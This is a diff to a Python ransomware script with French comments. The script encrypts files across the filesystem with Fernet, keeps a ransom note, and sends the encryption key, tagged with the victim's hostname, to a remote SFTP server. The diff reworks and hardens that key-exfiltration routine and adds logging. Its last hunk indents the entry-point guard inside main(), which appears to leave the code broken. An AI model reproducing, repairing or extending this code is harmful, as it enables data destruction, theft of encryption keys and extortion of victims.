@@ -26,6 +26,7 @@ EXCLUSIONS = {
     LOG_FILE, RANSOM_NOTE, SAFETY_LOCK, __file__
 }
 
+
 def install_dependencies():
     """Installe automatiquement les dépendances manquantes"""
     required = {'paramiko', 'cryptography'}
@@ -49,6 +50,7 @@ def install_dependencies():
             print("Échec de l'installation des dépendances. Installer manuellement avec:")
             print(f"pip install {' '.join(required)}")
             sys.exit(1)
+
 
 # Vérifier les dépendances dès le début
 install_dependencies()
@@ -82,25 +84,28 @@ def safety_checks():
         os.remove(SAFETY_LOCK)
         sys.exit(0)
 
+
 def send_key_via_sftp(key):
     """Envoi réel de la clé via SFTP avec gestion d'erreur améliorée"""
-    ssh = None
+    transport = None
     sftp = None
     try:
-        # Configuration du client SSH
-        ssh = paramiko.SSHClient()
-        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        # Configuration du transport
+        transport = paramiko.Transport((SFTP_SERVER, SFTP_PORT))
+        transport.connect(username=SFTP_USER, password=SFTP_PASS)
 
-        ssh.connect(SFTP_SERVER, port=SFTP_PORT,
-                   username=SFTP_USER, password=SFTP_PASS,
-                   timeout=10)
-        sftp = ssh.open_sftp()
+        sftp = paramiko.SFTPClient.from_transport(transport)
 
-        # Création du répertoire distant si nécessaire
+        # Vérification et création du répertoire upload
         try:
             sftp.stat(SFTP_REMOTE_PATH)
         except IOError:
-            sftp.mkdir(SFTP_REMOTE_PATH)
+            try:
+                sftp.mkdir(SFTP_REMOTE_PATH)
+                logging.info(f"Répertoire {SFTP_REMOTE_PATH} créé avec succès sur le serveur SFTP")
+            except Exception as e:
+                logging.error(f"Échec création répertoire {SFTP_REMOTE_PATH}: {str(e)}")
+                return False
 
         # Envoi du fichier
         remote_file = f"{SFTP_REMOTE_PATH}/{socket.gethostname()}_key_{datetime.now().strftime('%Y%m%d_%H%M%S')}.key"
@@ -108,6 +113,7 @@ def send_key_via_sftp(key):
         with sftp.file(remote_file, 'wb') as f:
             f.write(key)
 
+        logging.info(f"Clé envoyée avec succès à {remote_file}")
         return True
 
     except Exception as e:
@@ -116,13 +122,15 @@ def send_key_via_sftp(key):
     finally:
         if sftp:
             sftp.close()
-        if ssh:
-            ssh.close()
+        if transport:
+            transport.close()
+
 
 def should_encrypt(path):
     """Détermine si un fichier doit être chiffré"""
     path = os.path.abspath(path)
     return all(not path.startswith(excl) for excl in EXCLUSIONS)
+
 
 def encrypt_file(path, fernet):
     """Chiffre un fichier individuel"""
@@ -144,6 +152,7 @@ def encrypt_file(path, fernet):
         logging.warning(f"Échec chiffrement {path}: {str(e)}")
         return False
 
+
 def encrypt_system(fernet):
     """Parcourt et chiffre le système de fichiers"""
     encrypted_count = 0
@@ -157,6 +166,7 @@ def encrypt_system(fernet):
                     logging.info(f"Chiffrés: {encrypted_count} - Traitement {filepath}")
 
     return encrypted_count
+
 
 def main():
     # Configuration logging
@@ -203,5 +213,5 @@ Fichiers chiffrés: {count}
 
     logging.critical("=== CHIFFREMENT TERMINÉ ===")
 
-if __name__ == "__main__":
-    main()
+    if __name__ == "__main__":
+        main()
